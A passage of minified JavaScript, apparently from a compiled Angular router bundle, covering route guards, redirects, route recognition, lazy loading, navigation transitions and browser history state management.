o=e&&e.routeConfig?e.routeConfig.canDeactivate:null;if(!o||o.length===0)return J(!0);let s=o.map(a=>{let c=qc(e)??i,l=xs(a,c),h=F2(l)?l.canDeactivate(n,e,t,r):qt(c,()=>l(n,e,t,r));return ci(h).pipe(an())});return J(s).pipe(Ms())}function W2(n,e,t,r){let i=e.canLoad;if(i===void 0||i.length===0)return J(!0);let o=i.map(s=>{let a=xs(s,n),c=P2(a)?a.canLoad(e,t):qt(n,()=>a(e,t));return ci(c)});return J(o).pipe(Ms(),vS(r))}function vS(n){return Eg(nt(e=>{if(typeof e!="boolean")throw Nh(n,e)}),X(e=>e===!0))}function K2(n,e,t,r){let i=e.canMatch;if(!i||i.length===0)return J(!0);let o=i.map(s=>{let a=xs(s,n),c=V2(a)?a.canMatch(e,t):qt(n,()=>a(e,t));return ci(c)});return J(o).pipe(Ms(),vS(r))}var jc=class{segmentGroup;constructor(e){this.segmentGroup=e||null}},Bc=class extends Error{urlTree;constructor(e){super(),this.urlTree=e}};function _s(n){return zo(new jc(n))}function Q2(n){return zo(new Y(4e3,!1))}function Y2(n){return zo(gS(!1,nn.GuardRejected))}var hv=class{urlSerializer;urlTree;constructor(e,t){this.urlSerializer=e,this.urlTree=t}lineralizeSegments(e,t){let r=[],i=t.root;for(;;){if(r=r.concat(i.segments),i.numberOfChildren===0)return J(r);if(i.numberOfChildren>1||!i.children[oe])return Q2(`${e.redirectTo}`);i=i.children[oe]}}applyRedirectCommands(e,t,r,i,o){if(typeof t!="string"){let a=t,{queryParams:c,fragment:l,routeConfig:h,url:p,outlet:m,params:y,data:D,title:b}=i,T=qt(o,()=>a({params:y,data:D,queryParams:c,fragment:l,routeConfig:h,url:p,outlet:m,title:b}));if(T instanceof Dr)throw new Bc(T);t=T}let s=this.applyRedirectCreateUrlTree(t,this.urlSerializer.parse(t),e,r);if(t[0]==="/")throw new Bc(s);return s}applyRedirectCreateUrlTree(e,t,r,i){let o=this.createSegmentGroup(e,t.root,r,i);return new Dr(o,this.createQueryParams(t.queryParams,this.urlTree.queryParams),t.fragment)}createQueryParams(e,t){let r={};return Object.entries(e).forEach(([i,o])=>{if(typeof o=="string"&&o[0]===":"){let a=o.substring(1);r[i]=t[a]}else r[i]=o}),r}createSegmentGroup(e,t,r,i){let o=this.createSegments(e,t.segments,r,i),s={};return Object.entries(t.children).forEach(([a,c])=>{s[a]=this.createSegmentGroup(e,c,r,i)}),new Te(o,s)}createSegments(e,t,r,i){return t.map(o=>o.path[0]===":"?this.findPosParam(e,o,i):this.findOrReturn(o,r))}findPosParam(e,t,r){let i=r[t.path.substring(1)];if(!i)throw new Y(4001,!1);return i}findOrReturn(e,t){let r=0;for(let i of t){if(i.path===e.path)return t.splice(r),i;r++}return e}},fv={matched:!1,consumedSegments:[],remainingSegments:[],parameters:{},positionalParamSegments:{}};function Z2(n,e,t,r,i){let o=_S(n,e,t);return o.matched?(r=_2(e,r),K2(r,e,t,i).pipe(X(s=>s===!0?o:U({},fv)))):J(o)}function _S(n,e,t){if(e.path==="**")return J2(t);if(e.path==="")return e.pathMatch==="full"&&(n.hasChildren()||t.length>0)?U({},fv):{matched:!0,consumedSegments:[],remainingSegments:t,parameters:{},positionalParamSegments:{}};let i=(e.matcher||WL)(t,n,e);if(!i)return U({},fv);let o={};Object.entries(i.posParams??{}).forEach(([a,c])=>{o[a]=c.path});let s=i.consumed.length>0?U(U({},o),i.consumed[i.consumed.length-1].parameters):o;return{matched:!0,consumedSegments:i.consumed,remainingSegments:t.slice(i.consumed.length),parameters:s,positionalParamSegments:i.posParams??{}}}function J2(n){return{matched:!0,parameters:n.length>0?JT(n).parameters:{},consumedSegments:n,remainingSegments:[],positionalParamSegments:{}}}function GT(n,e,t,r){return t.length>0&&tU(n,t,r)?{segmentGroup:new Te(e,eU(r,new Te(t,n.children))),slicedSegments:[]}:t.length===0&&nU(n,t,r)?{segmentGroup:new Te(n.segments,X2(n,t,r,n.children)),slicedSegments:t}:{segmentGroup:new Te(n.segments,n.children),slicedSegments:t}}function X2(n,e,t,r){let i={};for(let o of t)if(Vh(n,e,o)&&!r[Tn(o)]){let s=new Te([],{});i[Tn(o)]=s}return U(U({},r),i)}function eU(n,e){let t={};t[oe]=e;for(let r of n)if(r.path===""&&Tn(r)!==oe){let i=new Te([],{});t[Tn(r)]=i}return t}function tU(n,e,t){return t.some(r=>Vh(n,e,r)&&Tn(r)!==oe)}function nU(n,e,t){return t.some(r=>Vh(n,e,r))}function Vh(n,e,t){return(n.hasChildren()||e.length>0)&&t.pathMatch==="full"?!1:t.path===""}function rU(n,e,t){return e.length===0&&!n.children[t]}var pv=class{};function iU(n,e,t,r,i,o,s="emptyOnly"){return new gv(n,e,t,r,i,s,o).recognize()}var oU=31,gv=class{injector;configLoader;rootComponentType;config;urlTree;paramsInheritanceStrategy;urlSerializer;applyRedirects;absoluteRedirectCount=0;allowRedirects=!0;constructor(e,t,r,i,o,s,a){this.injector=e,this.configLoader=t,this.rootComponentType=r,this.config=i,this.urlTree=o,this.paramsInheritanceStrategy=s,this.urlSerializer=a,this.applyRedirects=new hv(this.urlSerializer,this.urlTree)}noMatchError(e){return new Y(4002,`'${e.segmentGroup}'`)}recognize(){let e=GT(this.urlTree.root,[],[],this.config).segmentGroup;return this.match(e).pipe(X(({children:t,rootSnapshot:r})=>{let i=new tn(r,t),o=new Rh("",i),s=h2(r,[],this.urlTree.queryParams,this.urlTree.fragment);return s.queryParams=this.urlTree.queryParams,o.url=this.urlSerializer.serialize(s),{state:o,tree:s}}))}match(e){let t=new Is([],Object.freeze({}),Object.freeze(U({},this.urlTree.queryParams)),this.urlTree.fragment,Object.freeze({}),oe,this.rootComponentType,null,{});return this.processSegmentGroup(this.injector,this.config,e,oe,t).pipe(X(r=>({children:r,rootSnapshot:t})),Br(r=>{if(r instanceof Bc)return this.urlTree=r.urlTree,this.match(r.urlTree.root);throw r instanceof jc?this.noMatchError(r):r}))}processSegmentGroup(e,t,r,i,o){return r.segments.length===0&&r.hasChildren()?this.processChildren(e,t,r,o):this.processSegment(e,t,r,r.segments,i,!0,o).pipe(X(s=>s instanceof tn?[s]:[]))}processChildren(e,t,r,i){let o=[];for(let s of Object.keys(r.children))s==="primary"?o.unshift(s):o.push(s);return me(o).pipe(or(s=>{let a=r.children[s],c=w2(t,s);return this.processSegmentGroup(e,c,a,s,i)}),Ui((s,a)=>(s.push(...a),s)),$r(null),Ng(),tt(s=>{if(s===null)return _s(r);let a=wS(s);return sU(a),J(a)}))}processSegment(e,t,r,i,o,s,a){return me(t).pipe(or(c=>this.processSegmentAgainstRoute(c._injector??e,t,c,r,i,o,s,a).pipe(Br(l=>{if(l instanceof jc)return J(null);throw l}))),an(c=>!!c),Br(c=>{if(yS(c))return rU(r,i,o)?J(new pv):_s(r);throw c}))}processSegmentAgainstRoute(e,t,r,i,o,s,a,c){return Tn(r)!==s&&(s===oe||!Vh(i,o,r))?_s(i):r.redirectTo===void 0?this.matchSegmentAgainstRoute(e,i,r,o,s,c):this.allowRedirects&&a?this.expandSegmentAgainstRouteUsingRedirect(e,i,t,r,o,s,c):_s(i)}expandSegmentAgainstRouteUsingRedirect(e,t,r,i,o,s,a){let{matched:c,parameters:l,consumedSegments:h,positionalParamSegments:p,remainingSegments:m}=_S(t,i,o);if(!c)return _s(t);typeof i.redirectTo=="string"&&i.redirectTo[0]==="/"&&(this.absoluteRedirectCount++,this.absoluteRedirectCount>oU&&(this.allowRedirects=!1));let y=new Is(o,l,Object.freeze(U({},this.urlTree.queryParams)),this.urlTree.fragment,WT(i),Tn(i),i.component??i._loadedComponent??null,i,KT(i)),D=xh(y,a,this.paramsInheritanceStrategy);y.params=Object.freeze(D.params),y.data=Object.freeze(D.data);let b=this.applyRedirects.applyRedirectCommands(h,i.redirectTo,p,y,e);return this.applyRedirects.lineralizeSegments(i,b).pipe(tt(T=>this.processSegment(e,r,t,T.concat(m),s,!1,a)))}matchSegmentAgainstRoute(e,t,r,i,o,s){let a=Z2(t,r,i,e,this.urlSerializer);return r.path==="**"&&(t.children={}),a.pipe(Le(c=>c.matched?(e=r._injector??e,this.getChildConfig(e,r,i).pipe(Le(({routes:l})=>{let h=r._loadedInjector??e,{parameters:p,consumedSegments:m,remainingSegments:y}=c,D=new Is(m,p,Object.freeze(U({},this.urlTree.queryParams)),this.urlTree.fragment,WT(r),Tn(r),r.component??r._loadedComponent??null,r,KT(r)),b=xh(D,s,this.paramsInheritanceStrategy);D.params=Object.freeze(b.params),D.data=Object.freeze(b.data);let{segmentGroup:T,slicedSegments:F}=GT(t,m,y,l);if(F.length===0&&T.hasChildren())return this.processChildren(h,l,T,D).pipe(X(P=>new tn(D,P)));if(l.length===0&&F.length===0)return J(new tn(D,[]));let $=Tn(r)===o;return this.processSegment(h,l,T,F,$?oe:o,!0,D).pipe(X(P=>new tn(D,P instanceof tn?[P]:[])))}))):_s(t)))}getChildConfig(e,t,r){return t.children?J({routes:t.children,injector:e}):t.loadChildren?t._loadedRoutes!==void 0?J({routes:t._loadedRoutes,injector:t._loadedInjector}):W2(e,t,r,this.urlSerializer).pipe(tt(i=>i?this.configLoader.loadChildren(e,t).pipe(nt(o=>{t._loadedRoutes=o.routes,t._loadedInjector=o.injector})):Y2(t))):J({routes:[],injector:e})}};function sU(n){n.sort((e,t)=>e.value.outlet===oe?-1:t.value.outlet===oe?1:e.value.outlet.localeCompare(t.value.outlet))}function aU(n){let e=n.value.routeConfig;return e&&e.path===""}function wS(n){let e=[],t=new Set;for(let r of n){if(!aU(r)){e.push(r);continue}let i=e.find(o=>r.value.routeConfig===o.value.routeConfig);i!==void 0?(i.children.push(...r.children),t.add(i)):e.push(r)}for(let r of t){let i=wS(r.children);e.push(new tn(r.value,i))}return e.filter(r=>!t.has(r))}function WT(n){return n.data||{}}function KT(n){return n.resolve||{}}function cU(n,e,t,r,i,o){return tt(s=>iU(n,e,t,r,s.extractedUrl,i,o).pipe(X(({state:a,tree:c})=>ue(U({},s),{targetSnapshot:a,urlAfterRedirects:c}))))}function uU(n,e){return tt(t=>{let{targetSnapshot:r,guards:{canActivateChecks:i}}=t;if(!i.length)return J(t);let o=new Set(i.map(c=>c.route)),s=new Set;for(let c of o)if(!s.has(c))for(let l of ES(c))s.add(l);let a=0;return me(s).pipe(or(c=>o.has(c)?lU(c,r,n,e):(c.data=xh(c,c.parent,n).resolve,J(void 0))),nt(()=>a++),Wo(1),tt(c=>a===s.size?J(t):Rt))})}function ES(n){let e=n.children.map(t=>ES(t)).flat();return[n,...e]}function lU(n,e,t,r){let i=n.routeConfig,o=n._resolve;return i?.title!==void 0&&!fS(i)&&(o[$c]=i.title),dU(o,n,e,r).pipe(X(s=>(n._resolvedData=s,n.data=xh(n,n.parent,t).resolve,null)))}function dU(n,e,t,r){let i=Gy(n);if(i.length===0)return J({});let o={};return me(i).pipe(tt(s=>hU(n[s],e,t,r).pipe(an(),nt(a=>{if(a instanceof Uc)throw Nh(new bs,a);o[s]=a}))),Wo(1),xg(o),Br(s=>yS(s)?Rt:zo(s)))}function hU(n,e,t,r){let i=qc(e)??r,o=xs(n,i),s=o.resolve?o.resolve(e,t):qt(i,()=>o(e,t));return ci(s)}function qy(n){return Le(e=>{let t=n(e);return t?me(t).pipe(X(()=>e)):J(e)})}var IS=(()=>{class n{buildTitle(t){let r,i=t.root;for(;i!==void 0;)r=this.getResolvedTitleForRoute(i)??r,i=i.children.find(o=>o.outlet===oe);return r}getResolvedTitleForRoute(t){return t.data[$c]}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>V(fU),providedIn:"root"})}return n})(),fU=(()=>{class n extends IS{title;constructor(t){super(),this.title=t}updateTitle(t){let r=this.buildTitle(t);r!==void 0&&this.title.setTitle(r)}static \u0275fac=function(r){return new(r||n)(L(UT))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),Wc=new j("",{providedIn:"root",factory:()=>({})}),pU=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275cmp=Bn({type:n,selectors:[["ng-component"]],decls:1,vars:0,template:function(r,i){r&1&&Dt(0,"router-outlet")},dependencies:[vv],encapsulation:2})}return n})();function _v(n){let e=n.children&&n.children.map(_v),t=e?ue(U({},n),{children:e}):U({},n);return!t.component&&!t.loadComponent&&(e||t.loadChildren)&&t.outlet&&t.outlet!==oe&&(t.component=pU),t}var kh=new j(""),wv=(()=>{class n{componentLoaders=new WeakMap;childrenLoaders=new WeakMap;onLoadStartListener;onLoadEndListener;compiler=V(Zd);loadComponent(t){if(this.componentLoaders.get(t))return this.componentLoaders.get(t);if(t._loadedComponent)return J(t._loadedComponent);this.onLoadStartListener&&this.onLoadStartListener(t);let r=ci(t.loadComponent()).pipe(X(DS),nt(o=>{this.onLoadEndListener&&this.onLoadEndListener(t),t._loadedComponent=o}),Hr(()=>{this.componentLoaders.delete(t)})),i=new Bo(r,()=>new Ve).pipe(jo());return this.componentLoaders.set(t,i),i}loadChildren(t,r){if(this.childrenLoaders.get(r))return this.childrenLoaders.get(r);if(r._loadedRoutes)return J({routes:r._loadedRoutes,injector:r._loadedInjector});this.onLoadStartListener&&this.onLoadStartListener(r);let o=gU(r,this.compiler,t,this.onLoadEndListener).pipe(Hr(()=>{this.childrenLoaders.delete(r)})),s=new Bo(o,()=>new Ve).pipe(jo());return this.childrenLoaders.set(r,s),s}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function gU(n,e,t,r){return ci(n.loadChildren()).pipe(X(DS),tt(i=>i instanceof lc||Array.isArray(i)?J(i):me(e.compileModuleAsync(i))),X(i=>{r&&r(n);let o,s,a=!1;return Array.isArray(i)?(s=i,a=!0):(o=i.create(t).injector,s=o.get(kh,[],{optional:!0,self:!0}).flat()),{routes:s.map(_v),injector:o}}))}function mU(n){return n&&typeof n=="object"&&"default"in n}function DS(n){return mU(n)?n.default:n}var Ev=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>V(yU),providedIn:"root"})}return n})(),yU=(()=>{class n{shouldProcessUrl(t){return!0}extract(t){return t}merge(t,r){return t}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),CS=new j(""),bS=new j("");function vU(n,e,t){let r=n.get(bS),i=n.get(bt);return n.get(pe).runOutsideAngular(()=>{if(!i.startViewTransition||r.skipNextTransition)return r.skipNextTransition=!1,new Promise(l=>setTimeout(l));let o,s=new Promise(l=>{o=l}),a=i.startViewTransition(()=>(o(),_U(n))),{onViewTransitionCreated:c}=r;return c&&qt(n,()=>c({transition:a,from:e,to:t})),s})}function _U(n){return new Promise(e=>{Xm({read:()=>setTimeout(e)},{injector:n})})}var TS=new j(""),Iv=(()=>{class n{currentNavigation=null;currentTransition=null;lastSuccessfulNavigation=null;events=new Ve;transitionAbortSubject=new Ve;configLoader=V(wv);environmentInjector=V(Pt);urlSerializer=V(Hc);rootContexts=V(zc);location=V(vs);inputBindingEnabled=V(Fh,{optional:!0})!==null;titleStrategy=V(IS);options=V(Wc,{optional:!0})||{};paramsInheritanceStrategy=this.options.paramsInheritanceStrategy||"emptyOnly";urlHandlingStrategy=V(Ev);createViewTransition=V(CS,{optional:!0});navigationErrorHandler=V(TS,{optional:!0});navigationId=0;get hasRequestedNavigation(){return this.navigationId!==0}transitions;afterPreactivation=()=>J(void 0);rootComponentType=null;constructor(){let t=i=>this.events.next(new ev(i)),r=i=>this.events.next(new tv(i));this.configLoader.onLoadEndListener=r,this.configLoader.onLoadStartListener=t}complete(){this.transitions?.complete()}handleNavigationRequest(t){let r=++this.navigationId;this.transitions?.next(ue(U(U({},this.transitions.value),t),{id:r}))}setupNavigations(t,r,i){return this.transitions=new gt({id:0,currentUrlTree:r,currentRawUrl:r,extractedUrl:this.urlHandlingStrategy.extract(r),urlAfterRedirects:this.urlHandlingStrategy.extract(r),rawUrl:r,extras:{},resolve:()=>{},reject:()=>{},promise:Promise.resolve(!0),source:Nc,restoredState:null,currentSnapshot:i.snapshot,targetSnapshot:null,currentRouterState:i,targetRouterState:null,guards:{canActivateChecks:[],canDeactivateChecks:[]},guardsResult:null}),this.transitions.pipe(ut(o=>o.id!==0),X(o=>ue(U({},o),{extractedUrl:this.urlHandlingStrategy.extract(o.rawUrl)})),Le(o=>{let s=!1,a=!1;return J(o).pipe(Le(c=>{if(this.navigationId>o.id)return this.cancelNavigationTransition(o,"",nn.SupersededByNewNavigation),Rt;this.currentTransition=o,this.currentNavigation={id:c.id,initialUrl:c.rawUrl,extractedUrl:c.extractedUrl,targetBrowserUrl:typeof c.extras.browserUrl=="string"?this.urlSerializer.parse(c.extras.browserUrl):c.extras.browserUrl,trigger:c.source,extras:c.extras,previousNavigation:this.lastSuccessfulNavigation?ue(U({},this.lastSuccessfulNavigation),{previousNavigation:null}):null};let l=!t.navigated||this.isUpdatingInternalState()||this.isUpdatedBrowserUrl(),h=c.extras.onSameUrlNavigation??t.onSameUrlNavigation;if(!l&&h!=="reload"){let p="";return this.events.next(new ai(c.id,this.urlSerializer.serialize(c.rawUrl),p,bh.IgnoredSameUrlNavigation)),c.resolve(!1),Rt}if(this.urlHandlingStrategy.shouldProcessUrl(c.rawUrl))return J(c).pipe(Le(p=>{let m=this.transitions?.getValue();return this.events.next(new Ts(p.id,this.urlSerializer.serialize(p.extractedUrl),p.source,p.restoredState)),m!==this.transitions?.getValue()?Rt:Promise.resolve(p)}),cU(this.environmentInjector,this.configLoader,this.rootComponentType,t.config,this.urlSerializer,this.paramsInheritanceStrategy),nt(p=>{o.targetSnapshot=p.targetSnapshot,o.urlAfterRedirects=p.urlAfterRedirects,this.currentNavigation=ue(U({},this.currentNavigation),{finalUrl:p.urlAfterRedirects});let m=new Th(p.id,this.urlSerializer.serialize(p.extractedUrl),this.urlSerializer.serialize(p.urlAfterRedirects),p.targetSnapshot);this.events.next(m)}));if(l&&this.urlHandlingStrategy.shouldProcessUrl(c.currentRawUrl)){let{id:p,extractedUrl:m,source:y,restoredState:D,extras:b}=c,T=new Ts(p,this.urlSerializer.serialize(m),y,D);this.events.next(T);let F=dS(this.rootComponentType).snapshot;return this.currentTransition=o=ue(U({},c),{targetSnapshot:F,urlAfterRedirects:m,extras:ue(U({},b),{skipLocationChange:!1,replaceUrl:!1})}),this.currentNavigation.finalUrl=m,J(o)}else{let p="";return this.events.next(new ai(c.id,this.urlSerializer.serialize(c.extractedUrl),p,bh.IgnoredByUrlHandlingStrategy)),c.resolve(!1),Rt}}),nt(c=>{let l=new Yy(c.id,this.urlSerializer.serialize(c.extractedUrl),this.urlSerializer.serialize(c.urlAfterRedirects),c.targetSnapshot);this.events.next(l)}),X(c=>(this.currentTransition=o=ue(U({},c),{guards:A2(c.targetSnapshot,c.currentSnapshot,this.rootContexts)}),o)),U2(this.environmentInjector,c=>this.events.next(c)),nt(c=>{if(o.guardsResult=c.guardsResult,c.guardsResult&&typeof c.guardsResult!="boolean")throw Nh(this.urlSerializer,c.guardsResult);let l=new Zy(c.id,this.urlSerializer.serialize(c.extractedUrl),this.urlSerializer.serialize(c.urlAfterRedirects),c.targetSnapshot,!!c.guardsResult);this.events.next(l)}),ut(c=>c.guardsResult?!0:(this.cancelNavigationTransition(c,"",nn.GuardRejected),!1)),qy(c=>{if(c.guards.canActivateChecks.length)return J(c).pipe(nt(l=>{let h=new Jy(l.id,this.urlSerializer.serialize(l.extractedUrl),this.urlSerializer.serialize(l.urlAfterRedirects),l.targetSnapshot);this.events.next(h)}),Le(l=>{let h=!1;return J(l).pipe(uU(this.paramsInheritanceStrategy,this.environmentInjector),nt({next:()=>h=!0,complete:()=>{h||this.cancelNavigationTransition(l,"",nn.NoDataFromResolver)}}))}),nt(l=>{let h=new Xy(l.id,this.urlSerializer.serialize(l.extractedUrl),this.urlSerializer.serialize(l.urlAfterRedirects),l.targetSnapshot);this.events.next(h)}))}),qy(c=>{let l=h=>{let p=[];h.routeConfig?.loadComponent&&!h.routeConfig._loadedComponent&&p.push(this.configLoader.loadComponent(h.routeConfig).pipe(nt(m=>{h.component=m}),X(()=>{})));for(let m of h.children)p.push(...l(m));return p};return Xa(l(c.targetSnapshot.root)).pipe($r(null),sr(1))}),qy(()=>this.afterPreactivation()),Le(()=>{let{currentSnapshot:c,targetSnapshot:l}=o,h=this.createViewTransition?.(this.environmentInjector,c.root,l.root);return h?me(h).pipe(X(()=>o)):J(o)}),X(c=>{let l=D2(t.routeReuseStrategy,c.targetSnapshot,c.currentRouterState);return this.currentTransition=o=ue(U({},c),{targetRouterState:l}),this.currentNavigation.targetRouterState=l,o}),nt(()=>{this.events.next(new Vc)}),S2(this.rootContexts,t.routeReuseStrategy,c=>this.events.next(c),this.inputBindingEnabled),sr(1),nt({next:c=>{s=!0,this.lastSuccessfulNavigation=this.currentNavigation,this.events.next(new Cr(c.id,this.urlSerializer.serialize(c.extractedUrl),this.urlSerializer.serialize(c.urlAfterRedirects))),this.titleStrategy?.updateTitle(c.targetRouterState.snapshot),c.resolve(!0)},complete:()=>{s=!0}}),kg(this.transitionAbortSubject.pipe(nt(c=>{throw c}))),Hr(()=>{!s&&!a&&this.cancelNavigationTransition(o,"",nn.SupersededByNewNavigation),this.currentTransition?.id===o.id&&(this.currentNavigation=null,this.currentTransition=null)}),Br(c=>{if(a=!0,mS(c))this.events.next(new Ir(o.id,this.urlSerializer.serialize(o.extractedUrl),c.message,c.cancellationCode)),T2(c)?this.events.next(new Ss(c.url,c.navigationBehaviorOptions)):o.resolve(!1);else{let l=new Fc(o.id,this.urlSerializer.serialize(o.extractedUrl),c,o.targetSnapshot??void 0);try{let h=qt(this.environmentInjector,()=>this.navigationErrorHandler?.(l));if(h instanceof Uc){let{message:p,cancellationCode:m}=Nh(this.urlSerializer,h);this.events.next(new Ir(o.id,this.urlSerializer.serialize(o.extractedUrl),p,m)),this.events.next(new Ss(h.redirectTo,h.navigationBehaviorOptions))}else throw this.events.next(l),c}catch(h){this.options.resolveNavigationPromiseOnError?o.resolve(!1):o.reject(h)}}return Rt}))}))}cancelNavigationTransition(t,r,i){let o=new Ir(t.id,this.urlSerializer.serialize(t.extractedUrl),r,i);this.events.next(o),t.resolve(!1)}isUpdatingInternalState(){return this.currentTransition?.extractedUrl.toString()!==this.currentTransition?.currentUrlTree.toString()}isUpdatedBrowserUrl(){let t=this.urlHandlingStrategy.extract(this.urlSerializer.parse(this.location.path(!0))),r=this.currentNavigation?.targetBrowserUrl??this.currentNavigation?.extractedUrl;return t.toString()!==r?.toString()&&!this.currentNavigation?.extras.skipLocationChange}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function wU(n){return n!==Nc}var EU=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>V(IU),providedIn:"root"})}return n})(),mv=class{shouldDetach(e){return!1}store(e,t){}shouldAttach(e){return!1}retrieve(e){return null}shouldReuseRoute(e,t){return e.routeConfig===t.routeConfig}},IU=(()=>{class n extends mv{static \u0275fac=(()=>{let t;return function(i){return(t||(t=ps(n)))(i||n)}})();static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),SS=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>V(DU),providedIn:"root"})}return n})(),DU=(()=>{class n extends SS{location=V(vs);urlSerializer=V(Hc);options=V(Wc,{optional:!0})||{};canceledNavigationResolution=this.options.canceledNavigationResolution||"replace";urlHandlingStrategy=V(Ev);urlUpdateStrategy=this.options.urlUpdateStrategy||"deferred";currentUrlTree=new Dr;getCurrentUrlTree(){return this.currentUrlTree}rawUrlTree=this.currentUrlTree;getRawUrlTree(){return this.rawUrlTree}currentPageId=0;lastSuccessfulId=-1;restoredState(){return this.location.getState()}get browserPageId(){return this.canceledNavigationResolution!=="computed"?this.currentPageId:this.restoredState()?.\u0275routerPageId??this.currentPageId}routerState=dS(null);getRouterState(){return this.routerState}stateMemento=this.createStateMemento();createStateMemento(){return{rawUrlTree:this.rawUrlTree,currentUrlTree:this.currentUrlTree,routerState:this.routerState}}registerNonRouterCurrentEntryChangeListener(t){return this.location.subscribe(r=>{r.type==="popstate"&&t(r.url,r.state)})}handleRouterEvent(t,r){if(t instanceof Ts)this.stateMemento=this.createStateMemento();else if(t instanceof ai)this.rawUrlTree=r.initialUrl;else if(t instanceof Th){if(this.urlUpdateStrategy==="eager"&&!r.extras.skipLocationChange){let i=this.urlHandlingStrategy.merge(r.finalUrl,r.initialUrl);this.setBrowserUrl(r.targetBrowserUrl??i,r)}}else t instanceof Vc?(this.currentUrlTree=r.finalUrl,this.rawUrlTree=this.urlHandlingStrategy.merge(r.finalUrl,r.initialUrl),this.routerState=r.targetRouterState,this.urlUpdateStrategy==="deferred"&&!r.extras.skipLocationChange&&this.setBrowserUrl(r.targetBrowserUrl??this.rawUrlTree,r)):t instanceof Ir&&(t.code===nn.GuardRejected||t.code===nn.NoDataFromResolver)?this.restoreHistory(r):t instanceof Fc?this.restoreHistory(r,!0):t instanceof Cr&&(this.lastSuccessfulId=t.id,this.currentPageId=this.browserPageId)}setBrowserUrl(t,r){let i=t instanceof Dr?this.urlSerializer.serialize(t):t;if(this.location.isCurrentPathEqualTo(i)||r.extras.replaceUrl){let o=this.browserPageId,s=U(U({},r.extras.state),this.generateNgRouterState(r.id,o));this.location.replaceState(i,"",s)}else{let o=U(U({},r.extras.state),this.generateNgRouterState(r.id,this.browserPageId+1));this.location.go(i,"",o)}}restoreHistory(t,r=!1){if(this.canceledNavigationResolution==="computed"){let i=this.browserPageId,o=this.currentPageId-i;o!==0?this.location.historyGo(o):this.currentUrlTree===t.finalUrl&&o===0&&(this.resetState(t),this.resetUrlToCurrentUrlTree())}else this.canceledNavigationResolution==="replace"&&(r&&this.resetState(t),this.resetUrlToCurrentUrlTree())}resetState(t){this.routerState=this.stateMemento.routerState,this.currentUrlTree=this.stateMemento.currentUrlTree,this.rawUrlTree=this.urlHandlingStrategy.merge(this.currentUrlTree,t.finalUrl??this.rawUrlTree)}resetUrlToCurrentUrlTree(){this.location.replaceState(this.urlSerializer.serialize(this.rawUrlTree),"",this.generateNgRouterState(this.lastSuccessfulId,this.currentPageId))}generateNgRouterState(t,r){return this.canceledNavigationResolution==="computed"?{navigationId:t,\u0275routerPageId:r}:{navigationId:t}}static \u0275fac=(()=>{let t;return function(i){return(t||(t=ps(n)))(i||n)}})();static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),xc=function(n){return n[n.COMPLETE=0]="COMPLETE",n[n.FAILED=1]="FAILED",n[n.REDIRECTING=2]="REDIRECTING",n}(xc||{});function AS(n,e){n.events.pipe(ut(t=>t instanceof Cr||t instanceof Ir||t instanceof Fc||t instanceof ai),X(t=>t instanceof Cr||t instanceof ai?xc.COMPLETE:(t instanceof Ir?t.code===nn.Redirect||t.code===nn.SupersededByNewNavigation:!1)?xc.REDIRECTING:xc.FAILED),ut(t=>t!==xc.REDIRECTING),sr(1)).subscribe(()=>{e()})}var CU={paths:"exact",fragment:"ignored",matrixParams:"ignored",queryParams:"exact"},bU={paths:"subset",fragment:"ignored",matrixParams:"ignored",queryParams:"subset"},Sn=(()=>{class n{get currentUrlTree(){return this.stateManager.getCurrentUrlTree()}get rawUrlTree(){return this.stateManager.getRawUrlTree()}disposed=!1;nonRouterCurrentEntryChangeSubscription;console=V(qd);stateManager=V(SS);options=V(Wc,{optional:!0})||{};pendingTasks=V(pr);urlUpdateStrategy=this.options.urlUpdateStrategy||"deferred";navigationTransitions=V(Iv);urlSerializer=V(Hc);location=V(vs);urlHandlingStrategy=V(Ev);_events=new Ve;get events(){return this._events}get routerState(){return this.stateManager.getRouterState()}navigated=!1;routeReuseStrategy=V(EU);onSameUrlNavigation=this.options.onSameUrlNavigation||"ignore";config=V(kh,{optional:!0})?.flat()??[];componentInputBindingEnabled=!!V(Fh,{optional:!0});constructor(){this.resetConfig(this.config),this.navigationTransitions.setupNavigations(this,this.currentUrlTree,this.routerState).subscribe({error:t=>{this.console.warn(t)}}),this.subscribeToNavigationEvents()}eventsSubscription=new ze;subscribeToNavigationEvents(){let t=this.navigationTransitions.events.subscribe(r=>{try{let i=this.navigationTransitions.currentTransition,o=this.navigationTransitions.currentNavigation;if(i!==null&&o!==null){if(this.stateManager.handleRouterEvent(r,o),r instanceof Ir&&r.code!==nn.Redirect&&r.code!==nn.SupersededByNewNavigation)this.navigated=!0;else if(r instanceof Cr)this.navigated=!0;else if(r instanceof Ss){let s=r.navigationBehaviorOptions,a=this.urlHandlingStrategy.merge(r.url,i.currentRawUrl),c=U({browserUrl:i.extras.browserUrl,info:i.extras.info,skipLocationChange:i.extras.skipLocationChange,replaceUrl:i.extras.replaceUrl||this.urlUpdateStrategy==="eager"||wU(i.source)},s);this.scheduleNavigation(a,Nc,null,c,{resolve:i.resolve,reject:i.reject,promise:i.promise})}}SU(r)&&this._events.next(r)}catch(i){this.navigationTransitions.transitionAbortSubject.next(i)}});this.eventsSubscription.add(t)}resetRootComponentType(t){this.routerState.root.component=t,this.navigationTransitions.rootComponentType=t}initialNavigation(){this.setUpLocationChangeListener(),this.navigationTransitions.hasRequestedNavigation||this.navigateToSyncWithBrowser(this.location.path(!0),Nc,this.stateManager.restoredState())}setUpLocationChangeListener(){this.nonRouterCurrentEntryChangeSubscription??=this.stateManager.registerNonRouterCurrentEntryChangeListener((t,r)=>{setTimeout(()=>{this.navigateToSyncWithBrowser(t,"popstate",r)},0)})}navigateToSyncWithBrowser(t,r,i){let 